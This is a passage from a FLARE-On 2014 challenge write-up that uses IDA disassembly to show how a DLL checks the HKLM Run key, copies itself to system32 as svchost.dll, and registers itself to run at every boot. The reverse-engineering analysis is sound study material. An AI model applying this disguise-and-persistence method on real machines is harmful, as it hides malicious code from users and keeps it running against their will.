<p><strong>By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(</strong></p>

<p>Let&rsquo;s drop this into <code>IDA</code> and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also <a href="#ch7">challenge 7</a>). Put a breakpoint at the start of this function (<code>F2</code> key).</p>

<p><img src="/images/2014/flare/5-1.jpg" alt="DLL Entry Point" title="DLL Entry Point" /></p>

<p>If we attempt to execute the tile. IDA will complain. It&rsquo;s a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select <code>Local Win32 Debugger</code> then go to <code>Debugger</code> menu and select <code>Process Options</code>. In the <code>Application</code> textbox enter <code>c:\windows\system32\rundll32.exe</code>. In <code>Parameters</code> enter the path to the DLL. Don&rsquo;t forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. <code>&quot;c:\Flare Challenges\Ch5\5get_it.dll&quot;,0</code>). It didn&rsquo;t work without the dll extension for me.</p>

<p>Let&rsquo;s start debugging. We observe standard stuff until we reach <code>.text:1000A6BB call    sub_1000A570</code>.</p>

<p><img src="/images/2014/flare/5-2.jpg" alt="sub 1000A570" title="sub 1000A570" /></p>

<p>Inside the function we encounter <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx" target="_blank">RegOpenKeyEx</a> that opens a registry key. Full registry key is a combination of <code>hKey</code> and <code>lpSubKey</code>. <code>hKey</code> can be one of the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx" target="_blank">predefined keys</a>. The constants for the predefined keys needed a bit of googling because the MSDN page didn&rsquo;t list them. Here they are:</p>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">.
| Key                 | Constant |
|---------------------|----------|
| HKEY_CLASSES_ROOT   |    0     |
| HKEY_CURRENT_USER   |    1     |
| HKEY_LOCAL_MACHINE  |    2     |
| HKEY_USERS          |    3     |
| HKEY_CURRENT_CONFIG |    5     |
.
</pre></div>

<p>The binary is pushing <code>0x02</code> for <code>hKey</code> and <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> for <code>lpSubKey</code> which will result in the full path <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If function succeeds it will return <code>ERROR_SUCCESS</code> which is 0 according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx" target="_blank">this page</a>, otherwise it will return another error code.</p>

<p><img src="/images/2014/flare/5-3.jpg" alt="Registry Key" title="Registry Key" /></p>

<p>The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).<br />
<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx" target="_blank">RegQueryValueEx</a> checks if there is a registry key at an open path. It is looking for a registry key named <code>svchost</code> at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for <code>ERROR_FILE_NOT_FOUND</code> meaning there was no such key. Then it will call <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx" target="_blank">RegCloseKey</a> and closes the open registry path. This function&rsquo;s return value is saved in <code>var_110</code> (we will need it later):</p>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">.
|           Condition          |         Return Value          |
|------------------------------|-------------------------------|
|Registry key cannot be opened |               1               |
|Registry key does not exist   |               2               |
|Registry key exists           | 1000A6BB or DllMain(x,x,x)+3B |
.
</pre></div>

<p>After that function, we see that it is calling <code>GetModuleHandleEx</code> for <code>sub_1000A610</code> in lines 3-8 and checks the return value in line 9. The return value for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx" target="_blank">GetModuleHandleEx</a> will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Returning from sub_1000A570</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6BB</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_1000A570</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6C0</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_110</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>              <span style="color: #586E75">; return value stored in var_110</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6C6</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">phModule</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6D0</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">phModule</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6D6</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>                             <span style="color: #586E75">; phModule</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6D7</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">sub_1000A610</span>             <span style="color: #586E75">; lpModuleName</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6DC</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">6</span>                               <span style="color: #586E75">; dwFlags</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6DE</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">GetModuleHandleExA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6E4</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6E6</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A711</span>              <span style="color: #586E75">; if (eax!=0) jmp loc_1000A711</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6E8</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">GetLastError</span>                 <span style="color: #586E75">; if (eax==0) print LastError to file</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6EE</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_120</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6F4</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_120</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6FA</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A6FB</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aGetmodulehandl</span>          <span style="color: #586E75">; &quot;GetModuleHandle returned %d\n&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A700</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_1000AD77</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A705</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40h</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A708</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>                             <span style="color: #586E75">; FILE *</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A709</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_fprintf</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A70E</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ch</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>If <code>GetModuleHandleEx</code> was successful it will land here. <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx" target="_blank">GetModuleFileName</a> is called which will return the full path for the specified module in <code>hModule</code>. In this case, the binary retrieves its own path (line 9) and saves it in <code>[ebp+Filename]</code>. In line 10, return value of <code>sub_1000A570</code> is compared with 2.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Getting Dll path</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A711</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A711</span> <span style="color: #268BD2">loc_1000A711</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A711</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">100h</span>            <span style="color: #586E75">; nSize</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A716</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">Filename</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A71C</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; lpFilename</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A71D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">phModule</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A723</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; hModule</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A724</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">GetModuleFileNameA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A72A</span> <span style="color: #268BD2">cmp</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_110</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">2</span>           <span style="color: #586E75">; comparing return value of sub_1000A570 with 2</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A731</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A772</span>         <span style="color: #586E75">; if return value is not 2, then jump to loc_1000A772</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>If registry key did not exist, we will continue.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>CopyFile</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A733</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">lpNewFileName</span><span style="color: #93A1A1">],</span> <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aCWindowsSystem</span> <span style="color: #586E75">; &quot;c:\\windows\\system32\\svchost.dll&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A73D</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_124</span><span style="color: #93A1A1">],</span> <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aCWindowsSyst_0</span> <span style="color: #586E75">; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A747</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0</span>               <span style="color: #586E75">; bFailIfExists - 0 means overwrite if file already exists</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A749</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">lpNewFileName</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A74F</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>             <span style="color: #586E75">; lpNewFileName ; &quot;c:\\windows\\system32\\svchost.dll&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A750</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">Filename</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A756</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; lpExistingFileName - Dll name from GetModuleFileName</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A757</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">CopyFileA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A75D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_124</span><span style="color: #93A1A1">]</span>   <span style="color: #586E75">; From line 2</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A763</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A764</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_1000A610</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A769</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A76C</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_114</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We have already seen the strings being loaded in lines 1 and 2. Then <code>CopyFile</code> is called to copy itself to <code>c:\\windows\\system32\\svchost.dll</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>sub_1000A610</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A610</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A611</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">esp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A613</span> <span style="color: #268BD2">sub</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ch</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A616</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">phkResult</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A619</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; phkResult</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A61A</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aSoftwareMicr_0</span> <span style="color: #586E75">; &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A61F</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">80000002h</span>       <span style="color: #586E75">; hKey   &quot;HKEY_LOCAL_MACHINE&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A624</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">RegCreateKeyA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A62A</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_C</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A62D</span> <span style="color: #268BD2">cmp</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A631</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A663</span>

<span style="color: #586E75">; Continue if RegCreateKey was successful</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A633</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">lpData</span><span style="color: #93A1A1">]</span>  <span style="color: #586E75">; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A636</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; char *</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A637</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_strlen</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A63C</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A63F</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; cbData - strlen(lpData)</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A640</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">lpData</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A643</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>             <span style="color: #586E75">; lpData - ; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A644</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">1</span>               <span style="color: #586E75">; dwType</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A646</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0</span>               <span style="color: #586E75">; Reserved</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A648</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aSvchost_0</span> <span style="color: #586E75">; &quot;svchost&quot;</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A64D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">phkResult</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A650</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; hKey</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A651</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">RegSetValueExA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A657</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A65E</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A661</span> <span style="color: #268BD2">jmp</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A673</span>

<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A673</span> <span style="color: #268BD2">loc_1000A673</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A673</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A675</span> <span style="color: #268BD2">pop</span>     <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A676</span> <span style="color: #268BD2">retn</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Line 9 pushes <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> to the stack and calls <code>sub_1000A610</code> in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.</p>

<p>Inside this function we see that <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx" target="_blank">RegCreateKey</a> to open <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If the key does not exist, it will create it.</p>

<p>If call was successful, execution continues to line 14. It is adding a new registry key named <code>svchost</code> to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.</p>

<p><em>The Dll copied itself to system32 and it will run every time Windows starts</em>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Returning from sub_1000A610</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A757</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">CopyFileA</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A75D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_124</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A763</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A764</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_1000A610</span>     <span style="color: #586E75">; Create registry key</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A769</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A76C</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_114</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>   <span style="color: #586E75">; Not used anymore</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A772</span> <span style="color: #268BD2">loc_1000A772</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A772</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_1000A4C0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A777</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_118</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A77D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_118</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A783</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A786</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A788</span> <span style="color: #268BD2">call</span>    <span style="color: #93A1A1">@</span><span style="color: #268BD2">__security_check_cookie@4</span> <span style="color: #586E75">; __security_check_cookie(x)</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A78D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A78F</span> <span style="color: #268BD2">pop</span>     <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A790</span> <span style="color: #268BD2">retn</span>    <span style="color: #2AA198">0Ch</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A790</span> <span style="color: #268BD2">_DllMain@12</span> <span style="color: #268BD2">endp</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A790</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>After we return from <code>sub_1000A610</code>, we land in line 5. Return value will be saved in <code>var_114</code> (0 is key was created). If we highlight this variable and press <code>x</code> in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called <code>sub_1000A4C0</code>. Let&rsquo;s go inside.</p>

